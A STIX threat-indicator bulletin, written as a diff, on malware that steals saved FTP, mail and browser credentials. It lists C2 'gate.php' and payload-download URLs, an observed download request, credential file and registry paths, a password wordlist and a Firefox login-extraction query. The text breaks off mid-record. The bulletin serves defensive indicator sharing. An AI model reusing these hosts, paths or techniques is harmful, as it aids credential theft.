@@ -1,0 +1,1385 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:CISCP="http://www.us-cert.gov/ciscp" id="CISCP:IB-13-10389" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Malware targets FTP client data</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On April 9, 2013 this malware sample was submitted for analysis. This piece of malware has the capability to send data from an infected host, and can download and execute files from a remote C2. In addition, a significant portion of the code base provides parsing functionality for third-party software application data files, with a particular focus on FTP software. Analysis revealed seven unique URLs.
+
+This bulletin incorporates data that was originally published in MIFR-274676.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-07-02T19:30:00Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-5ea58d18-3a20-483d-b34d-45fc76653bab" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-ec63db9e-e78f-4335-a560-63f820c94268"/>
+        <indicator:Indicator idref="CISCP:indicator-2cce9545-4a7e-4b74-9be8-22cc34c11bfa"/>
+        <indicator:Indicator idref="CISCP:indicator-337aabc0-7986-4d2d-9bae-7e491a78f3b5"/>
+        <indicator:Indicator idref="CISCP:indicator-8967a369-e87f-4626-af72-289de2b5866a"/>
+        <indicator:Indicator idref="CISCP:indicator-8f83d937-04aa-41fc-9c22-b15a7d9a9be2"/>
+        <indicator:Indicator idref="CISCP:indicator-4f57e3e7-e125-4ed3-8e12-77a7bb16b903"/>
+        <indicator:Indicator idref="CISCP:indicator-e34e4ce0-730e-4b91-9863-01295194ea8d"/>
+        <indicator:Indicator idref="CISCP:indicator-90cc2ce2-75c4-40a6-a01b-5d15d67071d8"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ec63db9e-e78f-4335-a560-63f820c94268" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Section Hashes:
+d64c0b969f103bda67e6c2121a83f4e3 (header) 1024
+4fdc1a930bbc9fa516c8780c44b423ca .text 3072
+bb9e6cc9edd63fefe73c04e1b53b6b53 .rdata 1536
+bf619eac0cdf3f68d496ea9344137e8b .data 512
+d863166f6d0b0cbbc0807c86f2102594 .rsrc 124416
+
+Compile Date: 2013-01-23 18:06:17 UTC
+
+A similar piece of malware has been previously reported in IB-13-10302. Both pieces of malware attempt to access the same FTP client files. The samples both have 8 embedded URLs. This URL is referenced in both files: http://116.122.158.195:8080/ponyb/gate.php
+
+Upon execution, the malware writes a variable identifier to the system registry in the format,
+{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
+
+For example:
+HKCU\Software\WinRAR
+HWID = {2277B359-4776-4D29-A6F6-2EB7044FE019} (note: value differs on each occurrence)
+
+A significant portion of the malware's code base provides parsing functionality for third-party software application data files, with a particular focus on FTP software. For example, the malware attempts to open and read the contents of the following files:
+\wcx_ftp.ini
+\GHISLER\wcx_ftp.ini
+\GlobalSCAPE\CuteFTP\sm.dat
+\GlobalSCAPE\CuteFTP Pro\sm.dat
+\GlobalSCAPE\CuteFTP Lite\sm.dat
+\CuteFTP\sm.dat
+\FlashFXP\3\Sites.dat
+\FlashFXP\4\Sites.dat
+\FlashFXP\3\Quick.dat
+\FlashFXP\4\Quick.dat
+\FlashFXP\3\History.dat
+\FlashFXP\4\History.dat
+\FileZilla\sitemanager.xml
+\FileZilla\recentservers.xml
+\FileZilla\filezilla.xml
+\ExpanDrive\drives.js
+\CoffeeCup Software\SharedSettings.ccs
+\CoffeeCup Software\SharedSettings.sqlite
+\CoffeeCup Software\SharedSettings_1_0_5.ccs
+\CoffeeCup Software\SharedSettings_1_0_5.sqlite
+\32BitFtp.ini
+\Mozilla\Firefox\profiles.ini
+
+String data obtained from the malware's memory space suggest the capability to enumerate many additional applications not listed above.
+
+The malware has the capability to send data to a remote C2 via the HTTP POST method and download and execute files from a remote system. If a Portable Executable (PE) file is downloaded, the malware will save the file to the user's %TEMP% directory using a file name based on the host's tick count. The file is then executed.
+
+Analysis revealed eight unique URLs hard-coded in the malware. They are:
+http://64.34.70.32:8080/ponyb/gate.php
+http://64.34.70.31:8080/ponyb/gate.php
+http://94.32.66.114/ponyb/gate.php
+http://116.122.158.195:8080/ponyb/gate.php
+http://www.300dollarwebsites.com/D5cEhB.exe
+http://ecoastsystems.com/FAomC.exe
+http://heermeyer-ingenieurdienstleistungen.de/hu4.exe
+http://158909.webhosting61.1blu.de/MS2LLnfS.exe
+
+The following example shows a GET request observed from an infected system:
+
+GET /MS2LLnfS.exe HTTP/1.0
+Host: 158909.webhosting61.1blu.de
+Accept: */*
+Accept-Encoding: identity, *;q=0
+Connection: close
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)
+
+The malware has the following strings of interest:
+PPSV
+aPLib v1.01 - the smaller the better :)
+Copyright (c) 1998-2009 by Joergen Ibsen, All Rights Reserved.
+More information: http://www.ibsensoftware.com/
+123456
+password
+phpbb
+qwerty
+12345
+jesus
+12345678
+1234
+abc123
+letmein
+test
+love
+password1
+hello
+monkey
+dragon
+trustno1
+111111
+iloveyou
+1234567
+shadow
+123456789
+christ
+sunshine
+master
+computer
+princess
+tigger
+football
+angel
+jesus1
+123123
+whatever
+freedom
+killer
+asdf
+soccer
+superman
+michael
+cheese
+internet
+joshua
+fuckyou
+ssed
+baseball
+starwars
+000000
+purple
+jordan
+faith
+summer
+ashley
+buster
+heaven
+pepper
+7777777
+hunter
+lovely
+andrew
+thomas
+angels
+charlie
+daniel
+1111
+jennifer
+single
+hannah
+qazwsx
+happy
+matrix
+pass
+aaaaaa
+654321
+amanda
+nothing
+ginger
+mother
+snoopy
+jessica
+welcome
+pokemon
+iloveyou1
+11111
+mustang
+helpme
+justin
+jasmine
+orange
+testing
+apple
+michelle
+peace
+secret
+grace
+william
+iloveyou2
+nicole
+666666
+muffin
+gateway
+fuckyou1
+asshole
+hahaha
+poop
+blessing
+blahblah
+myspace1
+matthew
+canada
+silver
+robert
+forever
+asdfgh
+rachel
+rainbow
+guitar
+peanut
+batman
+cookie
+bailey
+soccer1
+mickey
+biteme
+hello1
+eminem
+dakota
+samantha
+compaq
+diamond
+taylor
+forum
+john316
+richard
+blink182
+peaches
+cool
+flower
+scooter
+banana
+james
+asdfasdf
+victory
+london
+123qwe
+123321
+startrek
+george
+winner
+maggie
+trinity
+online
+123abc
+chicken
+junior
+chris
+passw0rd
+austin
+sparky
+admin
+merlin
+google
+friends
+hope
+shalom
+nintendo
+looking
+harley
+smokey
+7777
+joseph
+lucky
+digital
+thunder
+spirit
+bandit
+enter
+anthony
+corvette
+hockey
+power
+benjamin
+iloveyou!
+1q2w3e
+viper
+genesis
+knight
+qwerty1
+creative
+foobar
+adidas
+rotimi
+slayer
+wisdom
+praise
+zxcvbnm
+samuel
+mike
+dallas
+green
+testtest
+maverick
+onelove
+david
+mylove
+church
+friend
+destiny
+none
+microsoft
+222222
+bubbles
+11111111
+cocacola
+jordan23
+ilovegod
+football1
+loving
+nathan
+emmanuel
+scooby
+fuckoff
+sammy
+maxwell
+jason
+john
+1q2w3e4r
+baby
+red123
+blabla
+prince
+qwert
+chelsea
+55555
+angel1
+hardcore
+dexter
+saved
+112233
+hallo
+jasper
+danielle
+kitten
+cassie
+stella
+prayer
+hotdog
+windows
+mustdie
+gates
+billgates
+ghbdtn
+gfhjkm
+1234567890
+et{rvkornwu
+http://64.34.70.32:8080/ponyb/gate.php
+http://64.34.70.31:8080/ponyb/gate.php
+http://94.32.66.114/ponyb/gate.php
+http://116.122.158.195:8080/ponyb/gate.php
+http://www.300dollarwebsites.com/D5cEhB.exe
+http://ecoastsystems.com/FAomC.exe
+http://heermeyer-ingenieurdienstleistungen.de/hu4.exe
+http://158909.webhosting61.1blu.de/MS2LLnfS.exe
+YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0
+MODU
+SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+UninstallString
+DisplayName
+.exe
+Software\WinRAR
+open
+kernel32.dll
+WTSGetActiveConsoleSessionId
+ProcessIdToSessionId
+netapi32.dll
+NetApiBufferFree
+NetUserEnum
+ole32.dll
+StgOpenStorage
+advapi32.dll
+AllocateAndInitializeSid
+CheckTokenMembership
+FreeSid
+CredEnumerateA
+CredFree
+CryptGetUserKey
+CryptExportKey
+CryptDestroyKey
+CryptReleaseContext
+RevertToSelf
+OpenProcessToken
+ImpersonateLoggedOnUser
+GetTokenInformation
+ConvertSidToStringSidA
+LogonUserA
+LookupPrivilegeValueA
+AdjustTokenPrivileges
+CreateProcessAsUserA
+crypt32.dll
+CryptUnprotectData
+CertOpenSystemStoreA
+CertEnumCertificatesInStore
+CertCloseStore
+CryptAcquireCertificatePrivateKey
+msi.dll
+MsiGetComponentPathA
+pstorec.dll
+PStoreCreateInstance
+userenv.dll
+CreateEnvironmentBlock
+DestroyEnvironmentBlock
+shell32.dll
+SHGetFolderPathA
+My Documents
+AppData
+Local AppData
+Cache
+Cookies
+History
+My Documents
+Common AppData
+My Pictures
+Common Documents
+Common Administrative Tools
+Administrative Tools
+Personal
+Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+explorer.exe
+S-1-5-18
+SeImpersonatePrivilege
+SeTcbPrivilege
+SeChangeNotifyPrivilege
+SeCreateTokenPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeIncreaseQuotaPrivilege
+SeAssignPrimaryTokenPrivilege
+POST %s HTTP/1.0
+Host: %s
+Accept: */*
+Accept-Encoding: identity, *;q=0
+Content-Length: %lu
+Connection: close
+Content-Type: application/octet-stream
+Content-Encoding: binary
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)
+Content-Length:
+Location:
+GET %s HTTP/1.0
+Host: %s
+Accept: */*
+Accept-Encoding: identity, *;q=0
+Connection: close
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)
+\*.*
+HWID
+{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
+GetNativeSystemInfo
+kernel32.dll
+IsWow64Process
+Software\Far\Plugins\FTP\Hosts
+Software\Far2\Plugins\FTP\Hosts
+Software\Far Manager\Plugins\FTP\Hosts
+Software\Far\SavedDialogHistory\FTPHost
+Software\Far2\SavedDialogHistory\FTPHost
+Software\Far Manager\SavedDialogHistory\FTPHost
+Password
+HostName
+User
+Line
+wcx_ftp.ini
+\GHISLER
+InstallDir
+FtpIniName
+Software\Ghisler\Windows Commander
+Software\Ghisler\Total Commander
+\Ipswitch
+Sites\
+\Ipswitch\WS_FTP
+\win.ini
+.ini
+WS_FTP
+DEFDIR
+CUTEFTP
+QCHistory
+Software\GlobalSCAPE\CuteFTP 6 Home\QCToolbar
+Software\GlobalSCAPE\CuteFTP 6 Professional\QCToolbar
+Software\GlobalSCAPE\CuteFTP 7 Home\QCToolbar
+Software\GlobalSCAPE\CuteFTP 7 Professional\QCToolbar
+Software\GlobalSCAPE\CuteFTP 8 Home\QCToolbar
+Software\GlobalSCAPE\CuteFTP 8 Professional\QCToolbar
+\GlobalSCAPE\CuteFTP
+\GlobalSCAPE\CuteFTP Pro
+\GlobalSCAPE\CuteFTP Lite
+\CuteFTP
+\sm.dat
+Software\FlashFXP\3
+Software\FlashFXP
+Software\FlashFXP\4
+InstallerDathPath
+path
+Install Path
+DataFolder
+\Sites.dat
+\Quick.dat
+\History.dat
+\FlashFXP\3
+\FlashFXP\4
+\FileZilla
+\sitemanager.xml
+\recentservers.xml
+\filezilla.xml
+Software\FileZilla
+Software\FileZilla Client
+Install_Dir
+Host
+User
+Pass
+Port
+Remote Dir
+Server Type
+Server.Host
+Server.User
+Server.Pass
+Server.Port
+Path
+ServerType
+Last Server Host
+Last Server User
+Last Server Pass
+Last Server Port
+Last Server Path
+Last Server Type
+FTP Navigator
+FTP Commander
+ftplist.txt
+\BulletProof Software
+.dat
+.bps
+Software\BPFTP\Bullet Proof FTP\Main
+Software\BulletProof Software\BulletProof FTP Client\Main
+Software\BPFTP\Bullet Proof FTP\Options
+Software\BulletProof Software\BulletProof FTP Client\Options
+Software\BPFTP
+LastSessionFile
+SitesDir
+InstallDir1
+.xml
+\SmartFTP
+Favorites.dat
+History.dat
+addrbk.dat
+quick.dat
+\TurboFTP
+Software\TurboFTP
+installpath
+Software\Sota\FFFTP
+CredentialSalt
+CredentialCheck
+Software\Sota\FFFTP\Options
+Password
+UserName
+HostAdrs
+RemoteDir
+Port
+HostName
+Port
+Username
+Password
+HostDirName
+Software\CoffeeCup Software\Internet\Profiles
+Software\FTPWare\COREFTP\Sites
+Host
+User
+Port
+PthR
+profiles.xml
+\FTP Explorer
+Software\FTP Explorer\FTP Explorer\Workspace\MFCToolBar-224
+Buttons
+Software\FTP Explorer\Profiles
+Password
+PasswordType
+Host
+Login
+Port
+InitialPath
+FtpSite.xml
+\Frigate3
+.ini
+_VanDyke\Config\Sessions
+\Sessions
+Software\VanDyke\SecureFX
+Config Path
+UltraFXP
+\sites.xml
+\FTPRush
+RushSite.xml
+Server
+Username
+Password
+FtpPort
+Software\Cryer\WebSitePublisher
+\BitKinex
+bitkinex.ds
+Hostname
+Username
+Password
+Port
+Software\ExpanDrive\Sessions
+\ExpanDrive
+\drives.js
+"password" : "
+Software\ExpanDrive
+ExpanDrive_Home
+Server
+UserName
+Password
+_Password
+Directory
+Software\NCH Software\ClassicFTP\FTPAccounts
+FtpServer
+FtpUserName
+FtpPassword
+_FtpPassword
+FtpDirectory
+SOFTWARE\NCH Software\Fling\Accounts
+Software\FTPClient\Sites
+Software\SoftX.org\FTPClient\Sites
+.oxc
+.oll
+ftplast.osd
+\GPSoftware\Directory Opus
+\SharedSettings.ccs
+\SharedSettings_1_0_5.ccs
+\SharedSettings.sqlite
+\SharedSettings_1_0_5.sqlite
+\CoffeeCup Software
+leapftp
+unleap.exe
+sites.dat
+sites.ini
+\LeapWare\LeapFTP
+SOFTWARE\LeapWare
+InstallPath
+DataDir
+Password
+HostName
+UserName
+RemoteDirectory
+PortNumber
+FSProtocol
+Software\Martin Prikryl
+\32BitFtp.ini
+NDSites.ini
+\NetDrive
+PassWord
+UserName
+RootDirectory
+Port
+Software\South River Technologies\WebDrive\Connections
+ServerType
+FTP CONTROL
+FTPCON
+.prf
+\Profiles
+http[:]//
+https[:]//
+ftp[:]//
+opera
+wand.dat
+_Software\Opera Software
+Last Directory3
+Last Install Path
+Opera.HTML\shell\open\command
+wiseftpsrvs.bin
+\AceBIT
+Software\AceBIT
+SOFTWARE\Classes\TypeLib\{CB1F2C0F-8094-4AAC-BCF5-41A64E27F777}
+SOFTWARE\Classes\TypeLib\{9EA55529-E122-4757-BC79-E4825F80732C}
+wiseftpsrvs.ini
+wiseftp.ini
+FTPVoyager.ftp
+FTPVoyager.qc
+\RhinoSoft.com
+nss3.dll
+NSS_Init
+NSS_Shutdown
+NSSBase64_DecodeBuffer
+SECITEM_FreeItem
+PK11_GetInternalKeySlot
+PK11_Authenticate
+PK11SDR_Decrypt
+PK11_FreeSlot
+sqlite3.dll
+sqlite3_open
+sqlite3_close
+sqlite3_prepare
+sqlite3_step
+sqlite3_column_bytes
+sqlite3_column_blob
+mozsqlite3.dll
+sqlite3_open
+sqlite3_close
+sqlite3_prepare
+sqlite3_step
+sqlite3_column_bytes
+sqlite3_column_blob
+profiles.ini
+Profile
+IsRelative
+Path
+PathToExe
+prefs.js
+signons.sqlite
+signons.txt
+signons2.txt
+signons3.txt
+SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins
+Firefox
+\Mozilla\Firefox\
+Software\Mozilla
+ftp[:]//
+http[:]//
+https[:]//
+ftp.
+fireFTPsites.dat
+SeaMonkey
+\Mozilla\SeaMonkey\
+Flock
+\Flock\Browser\
+Mozilla
+\Mozilla\Profiles\
+Software\LeechFTP
+AppDir
+LocalDir
+bookmark.dat
+SiteInfo.QFP
+Odin
+Favorites.dat
+WinFTP
+sites.db
+CLSID\{11C1D741-A95B-11d2-8A80-0080ADB32FF4}\InProcServer32
+servers.xml
+\FTPGetter
+ESTdb2.dat
+QData.dat
+\Estsoft\ALFTP
+Internet Explorer
+WininetCacheCredentials
+MS IE FTP Passwords
+DPAPI:
+@J7&lt;
+AJ7&lt;
+BJ7&lt;
+%02X
+Software\Microsoft\Internet Expl
+orer\IntelliForms\Storage2
+Microsoft_WinInet_*
+ftp[:]//
+Software\Adobe\Common
+SiteServers
+SiteServer %d\Host
+SiteServer %d\WebUrl
+SiteServer %d\Remote Directory
+SiteServer %d-User
+SiteServer %d-User PW
+%s\Keychain
+SiteServer %d\SFTP
+DeluxeFTP
+sites.xml
+Web Data
+Login Data
+SQLite format 3
+table
+CONSTRAINT
+PRIMARY
+UNIQUE
+CHECK
+FOREIGN
+logins
+origin_url
+password_value
+username_value
+ftp[:]//
+http[:]//
+https[:]//
+\Google\Chrome
+\Chromium
+\ChromePlus
+Software\ChromePlus
+Install_Dir
+\Bromium
+\Nichrome
+\Comodo
+\RockMelt
+K-Meleon
+\K-Meleon
+\Profiles
+Epic
+\Epic\Epic
+Staff-FTP
+sites.ini
+\Sites
+\Visicom Media
+.ftp
+\Global Downloader
+SM.arch
+FreshFTP
+.SMF
+BlazeFtp
+site.dat
+LastPassword
+LastAddress
+LastUser
+LastPort
+Software\FlashPeak\BlazeFtp\Settings
+\BlazeFtp
+.fpl
+FTP++.Link\shell\open\command
+GoFTP
+Connections.txt
+3D-FTP
+sites.ini
+\3D-FTP
+\SiteDesigner
+SOFTWARE\Classes\TypeLib\{F9043C88-F6F2-101A-A3C9-08002B2F49FB}\1.2\0\win32
+EasyFTP
+\NetSarang
+.xfp
+.rdp
+TERMSRV/*
+password 51:b:
+username:s:
+full address:s:
+TERMSRV/
+FTP Now
+FTPNow
+sites.xml
+SOFTWARE\Robo-FTP 3.7\Scripts
+SOFTWARE\Robo-FTP 3.7\FTPServers
+FTP Count
+FTP File%d
+Password
+ServerName
+UserID
+InitialDirectory
+PortNumber
+ServerType
+2.5.29.37
+Software\LinasFTP\Site Manager
+Host
+User
+Pass
+Port
+Remote Dir
+\Cyberduck
+.duck
+user.config
+&lt;setting name="
+value="
+Software\SimonTatham\PuTTY\Sessions
+HostName
+UserName
+Password
+PortNumber
+TerminalType
+NppFTP.xml
+\Notepad++
+Software\CoffeeCup Software
+FTP destination server
+FTP destination user
+FTP destination password
+FTP destination port
+FTP destination catalog
+FTP profiles
+FTPShell
+ftpshell.fsi
+Software\MAS-Soft\FTPInfo\Setup
+DataDir
+\FTPInfo
+ServerList.xml
+NexusFile
+ftpsite.ini
+FastStone Browser
+FTPList.db
+\MapleStudio\ChromePlus
+Software\Nico Mak Computing\WinZip\FTP
+Software\Nico Mak Computing\WinZip\mru\jobs
+Site
+UserID
+xflags
+Port
+Folder
+.wjf
+winex="
+\Yandex
+My FTP
+project.ini
+.xml
+{74FF1730-B1F2-4D88-926B-1568FAE61DB7}
+NovaFTP.db
+\INSoftware\NovaFTP
+.oeaccount
+Salt
+&lt;POP3_Password2
+&lt;SMTP_Password2
+&lt;IMAP_Password2
+&lt;HTTPMail_Password2
+\Microsoft\Windows Live Mail
+Software\Microsoft\Windows Live Mail
+\Microsoft\Windows Mail
+Software\Microsoft\Windows Mail
+Software\RimArts\B2\Settings
+DataDir
+DataDirBak
+Mailbox.ini
+Software\Poco Systems Inc
+Path
+\PocoSystem.ini
+Program
+DataPath
+accounts.ini
+\Pocomail
+Software\IncrediMail
+EmailAddress
+Technology
+PopServer
+PopPort
+PopAccount
+PopPassword
+SmtpServer
+SmtpPort
+SmtpAccount
+SmtpPassword
+account.cfg
+account.cfn
+\BatMail
+\The Bat!
+Software\RIT\The Bat!
+Software\RIT\The Bat!\Users depot
+Working Directory
+ProgramDir
+Count
+Default
+Dir #%d
+SMTP Email Address
+SMTP Server
+POP3 Server
+POP3 User Name
+SMTP User Name
+NNTP Email Address
+NNTP User Name
+NNTP Server
+IMAP Server
+IMAP User Name
+Email
+HTTP User
+HTTP Server URL
+POP3 User
+IMAP User
+HTTPMail User Name
+HTTPMail Server
+SMTP User
+POP3 Port
+SMTP Port
+IMAP Port
+POP3 Password2
+IMAP Password2
+NNTP Password2
+HTTPMail Password2
+SMTP Password2
+POP3 Password
+IMAP Password
+NNTP Password
+HTTP Password
+SMTP Password
+Software\Microsoft\Internet Account Manager\Accounts
+Identities
+Software\Microsoft\Office\Outlook\OMI Account Manager\Accounts
+Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging
+Subsystem\Profiles\Microsoft Outlook Internet Settings
+Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging
+Subsystem\Profiles\Outlook
+Software\Microsoft\Internet Account Manager
+Outlook
+\Accounts
+identification
+identitymgr
+inetcomm server passwords
+outlook account manager passwords
+identities
+{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
+Thunderbird
+\Thunderbird
+FastTrack
+ftplist.txt
+Client Hash
+STATUS-IMPORT-OK
+%d.exe
+%02X
+true
+%d.bat
+"%s"
+ShellExecuteA
+:ktk
+del
+%1
+if
+exist
+%1
+goto
+ktk
+del
+%0
+shell32.dll
+CreateFileA
+ReadFile
+CloseHandle
+WriteFile
+lstrlenA
+GlobalLock
+GlobalUnlock
+LocalFree
+LocalAlloc
+GetTickCount
+lstrcpyA
+lstrcatA
+GetFileAttributesA
+ExpandEnvironmentStringsA
+GetFileSize
+CreateFileMappingA
+MapViewOfFile
+UnmapViewOfFile
+LoadLibraryA
+GetProcAddress
+GetTempPathA
+CreateDirectoryA
+DeleteFileA
+GetCurrentProcess
+WideCharToMultiByte
+GetLastError
+lstrcmpA
+CreateToolhelp32Snapshot
+Process32First
+OpenProcess
+Process32Next
+FindFirstFileA
+lstrcmpiA
+FindNextFileA
+FindClose
+GetModuleHandleA
+GetVersionExA
+GetLocaleInfoA
+GetSystemInfo
+GetWindowsDirectoryA
+GetPrivateProfileStringA
+SetCurrentDirectoryA
+GetPrivateProfileSectionNamesA
+GetPrivateProfileIntA
+GetCurrentDirectoryA
+lstrlenW
+MultiByteToWideChar
+Sleep
+GetModuleFileNameA
+LCMapStringA
+ExitProcess
+SetUnhandledExceptionFilter
+kernel32.dll
+CreateStreamOnHGlobal
+GetHGlobalFromStream
+CoCreateGuid
+CoTaskMemFree
+CoCreateInstance
+OleInitialize
+ole32.dll
+wsprintfA
+user32.dll
+RegOpenKeyExA
+RegQueryValueExA
+RegCloseKey
+RegOpenKeyA
+RegEnumKeyExA
+RegCreateKeyA
+RegSetValueExA
+IsTextUnicode
+RegOpenCurrentUser
+RegEnumValueA
+GetUserNameA
+advapi32.dll
+ShellExecuteA
+shell32.dll
+InternetCrackUrlA
+InternetCreateUrlA
+wininet.dll
+StrStrIA
+StrRChrIA
+StrToIntA
+StrStrA
+StrCmpNIA
+StrStrIW
+shlwapi.dll
+inet_addr
+gethostbyname
+socket
+connect
+closesocket
+send
+select
+recv
+setsockopt
+WSAStartup
+wsock32.dll
+LoadUserProfileA
+UnloadUserProfile
+userenv.dll
+kernel32.dll
+CreateFileA
+ReadFile
+CloseHandle
+WriteFile
+lstrlenA
+GlobalLock
+GlobalUnlock
+LocalFree
+LocalAlloc
+GetTickCount
+lstrcpyA
+lstrcatA
+GetFileAttributesA
+ExpandEnvironmentStringsA
+GetFileSize
+CreateFileMappingA
+MapViewOfFile
+UnmapViewOfFile
+LoadLibraryA
+GetProcAddress
+GetTempPathA
+CreateDirectoryA
+DeleteFileA
+GetCurrentProcess
+WideCharToMultiByte
+GetLastError
+lstrcmpA
+CreateToolhelp32Snapshot
+Process32First
+OpenProcess
+Process32Next
+FindFirstFileA
+lstrcmpiA
+FindNextFileA
+FindClose
+GetModuleHandleA
+GetVersionExA
+GetLocaleInfoA
+GetSystemInfo
+GetWindowsDirectoryA
+GetPrivateProfileStringA
+SetCurrentDirectoryA
+GetPrivateProfileSectionNamesA
+GetPrivateProfileIntA
+GetCurrentDirectoryA
+lstrlenW
+MultiByteToWideChar
+Sleep
+GetModuleFileNameA
+LCMapStringA
+ExitProcess
+SetUnhandledExceptionFilter
+ole32.dll
+CreateStreamOnHGlobal
+GetHGlobalFromStream
+CoCreateGuid
+CoTaskMemFree
+CoCreateInstance
+OleInitialize
+USER32.dll
+wsprintfA
+ADVAPI32.dll
+RegOpenKeyExA
+RegQueryValueExA
+RegCloseKey
+RegOpenKeyA
+RegEnumKeyExA
+RegCreateKeyA
+RegSetValueExA
+IsTextUnicode
+RegOpenCurrentUser
+RegEnumValueA
+GetUserNameA
+shell32.dll
+ShellExecuteA
+wininet.dll
+InternetCrackUrlA
+InternetCreateUrlA
+SHLWAPI.dll
+StrStrIA
+StrRChrIA
+StrToIntA
+StrStrA
+StrCmpNIA
+StrStrIW
+WS2_32.dll
+inet_addr
+gethostbyname
+socket
+connect
+closesocket
+send
+select
+wsock32.dll
+recv
+setsockopt
+WS2_32.dll
+WSAStartup
+userenv.dll
+LoadUserProfileA
+UnloadUserProfile
+2http://www.facebook.com/
+abe2869f-9b47-4cd9-a358-c22904dba7f7
+e()
+pSettings</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-daab9177-d473-4eb2-9080-5a0bc4681b54">
+        <cybox:Object id="CISCP:Object-f03efa8d-8bba-4a42-a3f7-cec1f1200d20">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">IncomingFax.exe</FileObj:File_Name>
